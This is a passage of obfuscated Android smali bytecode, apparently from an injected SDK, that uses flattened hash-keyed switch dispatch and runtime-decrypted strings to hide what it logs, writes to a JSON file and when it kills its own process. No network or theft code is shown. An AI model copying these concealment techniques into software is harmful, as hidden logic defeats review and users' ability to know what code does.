    const-string v0, "\u06e0\u06db\u06e6\u06e7\u06e2\u06d9\u06d6\u06df\u06e5\u06d8\u06e4\u06e6\u06e8\u06d8\u06dc\u06e5\u06e1\u06d7\u06e7\u06e8\u06e5\u06e2\u06e8\u06d8\u06e6\u06e1\u06e0\u06dc\u06dc\u06e6\u06db\u06d6\u06da\u06df\u06ec\u06e1\u06d8\u06da\u06dc\u06d6\u06e0\u06d6\u06dc\u06dc\u06d7\u06eb"

    :goto_21
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_1f

    goto :goto_21

    :sswitch_68
    const-string v0, "\u06d9\u06e2\u06d6\u06d8\u06e0\u06d9\u06e1\u06d8\u06d6\u06dc\u06df\u06d9\u06e7\u06e6\u06d8\u06e1\u06e0\u06e6\u06df\u06d8\u06d8\u06d6\u06e6\u06e7\u06dc\u06db\u06e5\u06e7\u06da\u06e6\u06e0\u06df\u06e5\u06e7\u06e6\u06e1\u06d8\u06da\u06e1\u06e4\u06d9\u06d8\u06e5\u06e2\u06e0\u06e8"

    goto :goto_21

    :cond_e
    const-string v0, "\u06d6\u06e1\u06da\u06d7\u06da\u06d7\u06d9\u06e6\u06e6\u06e0\u06d8\u06d7\u06e7\u06e8\u06df\u06db\u06eb\u06e1\u06e2\u06e1\u06e8\u06d7\u06e8\u06d6\u06d6\u06d8\u06e5\u06d8\u06e2\u06e5\u06e5\u06d8\u06e7\u06e1\u06e6\u06e4\u06db\u06e0"

    goto :goto_21

    :sswitch_69
    const/4 v0, 0x2

    if-eq v9, v0, :cond_e

    const-string v0, "\u06d6\u06eb\u06d6\u06dc\u06dc\u06d6\u06d8\u06df\u06da\u06d8\u06e6\u06e2\u06e7\u06e8\u06dc\u06d8\u06da\u06eb\u06e1\u06e5\u06d9\u06d8\u06d8\u06db\u06df\u06e2\u06da\u06db\u06db\u06d6\u06ec\u06d6"

    goto :goto_21

    :sswitch_6a
    const-string v0, "\u06da\u06e5\u06eb\u06d6\u06da\u06e8\u06d8\u06eb\u06db\u06e4\u06df\u06df\u06e8\u06e0\u06d9\u06d6\u06d8\u06e4\u06d7\u06d8\u06eb\u06e1\u06e6\u06d8\u06d7\u06d8\u06df\u06e5\u06e7\u06e1\u06d8\u06d6\u06e5\u06e5\u06d7\u06d7\u06e6\u06da\u06dc\u06d8\u06e4\u06da\u06e5\u06d8\u06ec\u06e1\u06dc\u06d8\u06dc\u06da\u06e6\u06d7\u06da\u06e8\u06ec\u06e1\u06d6\u06eb\u06eb\u06dc"

    goto :goto_20

    :sswitch_6b
    const v1, -0x1dbb5ac2

    const-string v0, "\u06dc\u06e8\u06ec\u06dc\u06da\u06d9\u06d6\u06e8\u06d8\u06e8\u06e5\u06eb\u06e8\u06da\u06e7\u06e0\u06e2\u06e0\u06ec\u06e0\u06e7\u06e0\u06db\u06e8\u06d8\u06d9\u06d9\u06e0\u06db\u06eb\u06e6\u06d8"

    :goto_22
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_20

    goto :goto_22

    :sswitch_6c
    const v8, 0x1b508944

    const-string v0, "\u06d6\u06e7\u06e6\u06eb\u06e4\u06ec\u06e5\u06df\u06ec\u06e1\u06e8\u06d6\u06e7\u06e2\u06eb\u06e5\u06e8\u06dc\u06d8\u06e5\u06db\u06d6\u06da\u06ec\u06ec\u06e1\u06e5\u06dc\u06d8\u06e4\u06e4\u06e7"

    :goto_23
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_21

    goto :goto_23

    :sswitch_6d
    const-string v0, "\u06df\u06eb\u06df\u06d6\u06eb\u06e2\u06e2\u06da\u06e5\u06eb\u06d6\u06eb\u06d9\u06e2\u06e1\u06e8\u06e5\u06d6\u06df\u06e4\u06eb\u06dc\u06dc\u06e8\u06d8\u06d9\u06ec\u06df\u06d6\u06d9\u06e8\u06d8\u06ec\u06e0\u06db\u06eb\u06d9\u06da\u06db\u06e7\u06e6\u06ec\u06d9\u06d9\u06ec\u06d7\u06e6\u06d8\u06e6\u06e4\u06e5\u06da\u06e6\u06ec\u06e4\u06db\u06e8\u06d8"

    goto :goto_22

    :cond_f
    const-string v0, "\u06e7\u06db\u06dc\u06da\u06d8\u06e8\u06e5\u06ec\u06e6\u06dc\u06e4\u06d6\u06d6\u06e1\u06e8\u06df\u06e2\u06e4\u06e6\u06db\u06dc\u06e1\u06e1\u06db\u06df\u06e2\u06e1\u06d8\u06e0\u06d7\u06e4\u06e2\u06d8\u06e8\u06d8\u06e4\u06e5\u06ec\u06db\u06ec\u06e4\u06da\u06eb"

    goto :goto_23

    :sswitch_6e
    const/4 v0, 0x3

    if-eq v9, v0, :cond_f

    const-string v0, "\u06db\u06d9\u06eb\u06e1\u06e6\u06ec\u06ec\u06da\u06e6\u06d8\u06d9\u06e4\u06dc\u06d8\u06e2\u06e2\u06db\u06ec\u06ec\u06e5\u06d6\u06da\u06e6\u06e0\u06e5\u06eb\u06e6\u06d7\u06e1\u06d8\u06da\u06dc\u06e5\u06d7\u06e8\u06e1\u06e1\u06e2\u06d9\u06e0\u06e4\u06ec\u06d7\u06da"

    goto :goto_23

    :sswitch_6f
    const-string v0, "\u06e4\u06e7\u06e8\u06d8\u06e5\u06e4\u06e6\u06d8\u06d9\u06da\u06db\u06ec\u06db\u06e8\u06d6\u06e5\u06eb\u06e2\u06ec\u06e4\u06e4\u06e5\u06e6\u06d8\u06ec\u06e0\u06df\u06da\u06df\u06e8\u06e8\u06e6\u06d6"

    goto :goto_23

    :sswitch_70
    const-string v0, "\u06d6\u06e8\u06e1\u06d8\u06df\u06e1\u06e7\u06d8\u06e4\u06dc\u06ec\u06e5\u06e2\u06d8\u06db\u06df\u06d8\u06e4\u06e7\u06d9\u06e5\u06e6\u06e1\u06e1\u06db\u06e5\u06db\u06e2\u06e4\u06da\u06e0\u06ec\u06ec\u06df\u06d9\u06e8\u06da\u06da\u06d6\u06eb\u06df\u06da\u06eb\u06e0\u06d9\u06e6\u06eb\u06d7\u06eb"

    goto :goto_22

    :sswitch_71
    const-string v0, "\u06e6\u06d8\u06e8\u06d8\u06e1\u06e2\u06e6\u06dc\u06d6\u06e4\u06e0\u06e2\u06d8\u06d8\u06d7\u06db\u06e8\u06d8\u06d8\u06e1\u06da\u06dc\u06e5\u06e8\u06d8\u06e4\u06d6\u06d6\u06db\u06d9\u06ec\u06e6\u06e7\u06e2\u06db\u06e5\u06d8\u06eb\u06d9\u06e4\u06e1\u06e1\u06e6\u06df\u06e6\u06e8\u06e8\u06e2\u06d9\u06db\u06e8\u06dc"

    goto :goto_22

    :sswitch_72
    :try_start_5
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "q1rU8qmbg5ESJ8iO9Lk7KXw4jfHB04pxFAXFjvCs\n"

    const-string v2, "8L1oYUw2G8w=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "gZiruHkIl2bUwqjNIhXIBNeSwOZWV+9+\n"

    const-string v2, "biQnXcWxcuE=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "a1A2T7k=\n"

    const-string v2, "DiJEIMsUbSc=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, LCu7y/sdk/c5;

    const/4 v2, 0x1

    invoke-direct {v1, v2, p0, v10}, LCu7y/sdk/c5;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, LCu7y/sdk/a5;

    const/4 v2, 0x2

    invoke-direct {v1, v2}, LCu7y/sdk/a5;-><init>(I)V

    const-wide/16 v2, 0x5dc

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :goto_24
    return-void

    :sswitch_73
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "xT00MIhyWbB8QChM1VDhCBJfbTPgOlBQemIlTNFF\n"

    const-string v8, "ntqIo23fwe0=\n"

    invoke-static {v1, v8}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "EMvyv2pi5/JFkfHKMX+4\n"

    const-string v7, "/3d+WtbbAnU=\n"

    invoke-static {v1, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "af/eRzA=\n"

    const-string v7, "DI2sKEKNx48=\n"

    invoke-static {v1, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, LCu7y/sdk/c5;

    const/4 v7, 0x0

    invoke-direct {v1, v7, p0, v10}, LCu7y/sdk/c5;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :sswitch_74
    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto/16 :goto_c

    :sswitch_75
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "+M7CwMSxlaxBs968mZMtFC+sm8Os+ZxMR5HTvJ2G\n"

    const-string v2, "oyl+UyEcDfE=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "aworMTPoa0EmXhhGYMEB\n"

    const-string v2, "hLan1ohgjew=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "McoCGk0=\n"

    const-string v2, "VLhwdT+j8TI=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v0

    invoke-static {v0}, Landroid/os/Process;->killProcess(I)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_24

    :catch_1
    move-exception v0

    const-string v1, "DwICsDei7SmwWAHERqeSyMcAE7s7iviT6UtbqXLnyMmxQQ/LZqqayM4=\n"

    const-string v2, "VOW+I9IPdXQ=\n"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v1, v2, v3, v0}, LCu7y/sdk/r;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/lang/Exception;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "bABxGIc=\n"

    const-string v2, "CXIDd/VusII=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_24

    :sswitch_76
    :try_start_6
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "iocfgn9pmpoz+gP+IksiIl3lRoEXIZN6NdgO/iZe\n"

    const-string v2, "0WCjEZrEAsc=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "CbW3w5OkNc9E7LGEwJFuh0W6\n"

    const-string v2, "5gk7JCgs02I=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "CMYpG5Q=\n"

    const-string v2, "bbRbdOZHaVU=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_24

    :cond_10
    const-string v0, "\u06e1\u06e2\u06e1\u06d8\u06e7\u06d9\u06e6\u06d8\u06e0\u06da\u06eb\u06dc\u06e1\u06e4\u06df\u06eb\u06df\u06db\u06d7\u06dc\u06d8\u06df\u06d6\u06e0\u06df\u06e7\u06e8\u06d7\u06db\u06d7\u06d9\u06e0\u06e6\u06d8\u06e0\u06e4\u06e6\u06d8\u06e5\u06e1\u06e5"

    goto/16 :goto_f

    :sswitch_77
    if-eqz v3, :cond_10

    const-string v0, "\u06dc\u06eb\u06d9\u06d6\u06e8\u06d9\u06db\u06d6\u06db\u06eb\u06db\u06e2\u06d6\u06d9\u06d8\u06e1\u06e7\u06d9\u06d9\u06da\u06ec\u06db\u06dc\u06d8\u06df\u06db\u06e5\u06d8\u06d6\u06df\u06d8\u06d8\u06db\u06da\u06d8\u06d8\u06e8\u06e7\u06e2\u06d7\u06d8\u06e1\u06d7\u06d8\u06d8\u06db\u06d9\u06eb\u06e2\u06d7\u06d6"

    goto/16 :goto_f

    :sswitch_78
    const-string v0, "\u06d9\u06d9\u06e5\u06ec\u06e4\u06d7\u06dc\u06e5\u06ec\u06e4\u06e7\u06dc\u06d8\u06d8\u06da\u06d7\u06e4\u06db\u06eb\u06e0\u06df\u06e8\u06d8\u06db\u06db\u06dc\u06d8\u06da\u06df\u06e5\u06d8\u06d7\u06eb\u06dc\u06d8\u06eb\u06d6\u06e1\u06ec\u06e1"

    goto/16 :goto_f

    :sswitch_79
    const-string v0, "\u06df\u06d6\u06e8\u06d9\u06e7\u06d6\u06d9\u06e5\u06e6\u06d8\u06e5\u06d6\u06e7\u06e4\u06da\u06d8\u06d8\u06d9\u06e8\u06eb\u06e1\u06df\u06d7\u06e7\u06e0\u06e6\u06d8\u06e7\u06e7\u06df\u06db\u06db\u06d6\u06d8\u06dc\u06eb\u06d7\u06e1\u06e7\u06e5\u06e8\u06db\u06e6\u06ec\u06dc\u06e4\u06e7\u06e8\u06e7\u06d7\u06e2\u06e6"
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto/16 :goto_e

    :sswitch_7a
    const-string v0, "\u06d7\u06df\u06e4\u06d7\u06d7\u06e6\u06d8\u06e6\u06da\u06e0\u06e1\u06da\u06d8\u06d8\u06e6\u06d7\u06e0\u06e8\u06d7\u06e2\u06e0\u06d6\u06db\u06e8\u06e4\u06e4\u06d6\u06d6\u06d7\u06da\u06d7\u06eb\u06db\u06e7\u06da\u06ec\u06e2\u06e1\u06d8\u06e1\u06d9\u06e6\u06e7\u06e7\u06e7"

    goto/16 :goto_e

    :sswitch_7b
    :try_start_7
    new-instance v0, Ljava/io/File;

    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    const-string v4, "SSgjlUQ4DEBfLTSfWw4IUHQnI5VHAkNJWCss\n"

    const-string v6, "K0RC9i9nbSM=\n"

    invoke-static {v4, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v0, v1, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    :try_start_8
    new-instance v1, Ljava/io/FileWriter;

    const/4 v4, 0x0

    invoke-direct {v1, v0, v4}, Ljava/io/FileWriter;-><init>(Ljava/io/File;Z)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_2

    const/4 v0, 0x2

    :try_start_9
    invoke-virtual {v3, v0}, Lorg/json/JSONArray;->toString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/Writer;->flush()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    :try_start_a
    invoke-virtual {v1}, Ljava/io/Writer;->close()V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_2

    :goto_25
    :try_start_b
    invoke-static {}, Lapi/repository/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v4

    const v1, 0x7a9ac6e5

    const-string v0, "\u06e2\u06d7\u06d6\u06e7\u06dc\u06d8\u06db\u06d6\u06e5\u06d8\u06ec\u06e8\u06d6\u06d9\u06ec\u06d9\u06d8\u06e7\u06e0\u06d6\u06db\u06e8\u06d8\u06eb\u06d7\u06d7\u06ec\u06d8\u06e6\u06e7\u06da\u06e0\u06e5\u06ec\u06d6\u06e7\u06e6\u06d7\u06eb\u06e6\u06d8\u06d9\u06df\u06e6\u06d8\u06e7\u06d9\u06ec\u06d8\u06d7"

    :goto_26
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v1

    sparse-switch v6, :sswitch_data_22

    goto :goto_26

    :sswitch_7c
    const v6, 0x68ca7b02

    const-string v0, "\u06d8\u06e0\u06e8\u06d7\u06e7\u06e5\u06eb\u06e1\u06db\u06e4\u06e8\u06db\u06e1\u06e1\u06e2\u06eb\u06d6\u06e1\u06e6\u06db\u06e7\u06e6\u06e1\u06e8\u06d8\u06e2\u06e1\u06d6\u06d6\u06e5\u06e6\u06d8"

    :goto_27
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_23

    goto :goto_27

    :sswitch_7d
    const-string v0, "\u06ec\u06e2\u06e5\u06ec\u06e2\u06da\u06df\u06df\u06e4\u06df\u06dc\u06e5\u06d6\u06e1\u06d8\u06d7\u06e7\u06ec\u06e1\u06da\u06e1\u06df\u06d8\u06d9\u06ec\u06e4\u06d6\u06d8\u06e5\u06d6\u06dc\u06d8\u06e7\u06e6\u06d7\u06e6\u06d6\u06df\u06d8\u06e1\u06e2\u06d7\u06d8\u06d8\u06ec\u06e7\u06e8\u06d8\u06db\u06d7\u06dc\u06d8\u06e7\u06d8\u06e4\u06eb\u06d9\u06da"
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_1

    goto :goto_26

    :catchall_0
    move-exception v0

    :try_start_c
    invoke-virtual {v1}, Ljava/io/Writer;->close()V
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    :goto_28
    :try_start_d
    throw v0
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_2

    :catch_2
    move-exception v0

    :try_start_e
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "v2P/vV9P1MQNP9LLKm+pFHFhxbdfZ+l8QDWrmh8N8AM=\n"

    const-string v6, "5IRDLrriTJk=\n"

    invoke-static {v4, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "GBnSL0U=\n"

    const-string v4, "fWugQDdWzb4=\n"

    invoke-static {v1, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_1

    goto :goto_25

    :catchall_1
    move-exception v1

    :try_start_f
    invoke-virtual {v0, v1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_2

    goto :goto_28

    :sswitch_7e
    :try_start_10
    const-string v0, "\u06e5\u06df\u06e1\u06db\u06e4\u06e1\u06dc\u06d8\u06d6\u06d6\u06e8\u06d8\u06e8\u06d8\u06d6\u06d8\u06db\u06e6\u06eb\u06e4\u06df\u06d8\u06e6\u06e6\u06db\u06e6\u06e0\u06e5\u06e6\u06ec\u06ec\u06da\u06da\u06e0\u06e6\u06da\u06d6\u06e4\u06e1\u06d8\u06d7\u06e8\u06e6\u06d8\u06db\u06e4\u06e6\u06d8\u06e6\u06da\u06e5\u06d8"

    goto :goto_26

    :cond_11
    const-string v0, "\u06e7\u06e4\u06e7\u06db\u06d9\u06dc\u06d8\u06eb\u06e2\u06df\u06da\u06db\u06dc\u06e8\u06eb\u06dc\u06d8\u06e6\u06da\u06eb\u06db\u06d9\u06d9\u06e7\u06da\u06e8\u06d8\u06e1\u06d6\u06db\u06d8\u06d8\u06ec\u06e0\u06e4\u06e6\u06e4\u06e1\u06db\u06ec\u06db\u06e1\u06e0\u06df\u06e5\u06e6\u06e7\u06e0\u06d7\u06db\u06e1"

    goto :goto_27

    :sswitch_7f
    if-eqz v4, :cond_11

    const-string v0, "\u06e6\u06d8\u06d6\u06e4\u06e6\u06ec\u06e7\u06e5\u06df\u06e4\u06dc\u06e6\u06e4\u06d8\u06e8\u06d8\u06e4\u06d6\u06d8\u06d9\u06e0\u06df\u06e5\u06e7\u06e7\u06eb\u06e4\u06df\u06df\u06d8\u06e5\u06d8\u06ec\u06d9\u06da\u06d6"

    goto :goto_27

    :sswitch_80
    const-string v0, "\u06e0\u06eb\u06e1\u06da\u06eb\u06e0\u06e8\u06df\u06e1\u06d8\u06d6\u06e8\u06db\u06e8\u06e4\u06d6\u06d8\u06d6\u06d8\u06d7\u06dc\u06da\u06e6\u06d8\u06e0\u06e4\u06e5\u06da\u06df\u06e7\u06e2\u06e0\u06e8\u06d8\u06e6\u06d6\u06e1\u06d8\u06e1\u06e5\u06d8\u06d8\u06ec\u06df\u06da\u06e4\u06d9\u06d8\u06d8\u06e6\u06d6\u06e2\u06d9\u06e1\u06d6\u06d8"
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_1

    goto :goto_27

    :sswitch_81
    const-string v0, "\u06e2\u06db\u06e4\u06e0\u06d7\u06e5\u06d9\u06d8\u06df\u06d8\u06eb\u06e7\u06ec\u06e1\u06dc\u06db\u06ec\u06e7\u06e8\u06e8\u06df\u06df\u06e5\u06df\u06d8\u06db\u06e4\u06e0\u06e8\u06e6\u06dc\u06e4\u06e5\u06e7\u06e2\u06d9"

    goto :goto_26

    :sswitch_82
    :try_start_11
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    move v1, v2

    :goto_29
    const v2, 0x5562a059

    const-string v0, "\u06df\u06e6\u06ec\u06e6\u06e2\u06e1\u06d9\u06d8\u06e1\u06db\u06e0\u06e2\u06d6\u06e2\u06e6\u06d8\u06e1\u06db\u06d6\u06d8\u06d9\u06e1\u06db\u06e6\u06e0\u06d6\u06e2\u06d7\u06e1\u06d8\u06dc\u06d8\u06e4\u06db\u06e7\u06d6\u06d8\u06e7\u06e6\u06e1"

    :goto_2a
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v2

    sparse-switch v7, :sswitch_data_24

    goto :goto_2a

    :goto_2b
    :sswitch_83
    invoke-static {}, Lapi/repository/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v1

    const v2, 0x7ddd7c13

    const-string v0, "\u06d7\u06df\u06e8\u06d8\u06e8\u06d7\u06d6\u06d8\u06e6\u06eb\u06eb\u06e8\u06e8\u06d8\u06d8\u06e8\u06e0\u06d9\u06d8\u06e1\u06eb\u06db\u06da\u06e8\u06e0\u06ec\u06e0\u06db\u06d9\u06dc\u06df\u06d6"

    :goto_2c
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_25

    goto :goto_2c

    :sswitch_84
    const-string v0, "\u06e8\u06e8\u06df\u06e6\u06d8\u06ec\u06df\u06e1\u06d8\u06e2\u06dc\u06e6\u06d8\u06e1\u06e0\u06e2\u06e2\u06e4\u06e2\u06e6\u06d9\u06da\u06e1\u06d8\u06e5\u06e2\u06eb\u06e7\u06e2\u06e6\u06d8\u06e4\u06e5\u06e6\u06d8\u06df\u06df\u06d8"

    goto :goto_2c

    :sswitch_85
    const-string v0, "\u06d9\u06e8\u06d6\u06db\u06e8\u06db\u06dc\u06db\u06d8\u06d8\u06d7\u06d8\u06e0\u06e8\u06ec\u06e2\u06e6\u06e8\u06e6\u06e7\u06d9\u06d9\u06db\u06d6\u06db\u06eb\u06d8\u06e4\u06d7\u06eb\u06ec\u06d6\u06e0\u06e4\u06e0\u06df\u06e1\u06e5\u06e2\u06da\u06d8\u06df\u06d6\u06df\u06e4\u06e8\u06e0"

    goto :goto_2a

    :sswitch_86
    const v7, 0x2c85d39f

    const-string v0, "\u06e1\u06dc\u06e8\u06d8\u06e4\u06d6\u06e6\u06e7\u06e2\u06d6\u06d8\u06d7\u06e1\u06e2\u06df\u06eb\u06e6\u06d8\u06e0\u06d9\u06e1\u06db\u06df\u06e8\u06e1\u06eb\u06d8\u06e2\u06df\u06e2\u06e1\u06ec\u06e5\u06d6\u06df\u06e0\u06e5\u06ec\u06e2\u06d6\u06e2\u06eb\u06e2\u06e5\u06d7\u06e7\u06da\u06e1\u06d8\u06d7\u06e6\u06df\u06da\u06d8\u06e5\u06d8\u06df\u06e8\u06d6\u06d8"

    :goto_2d
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

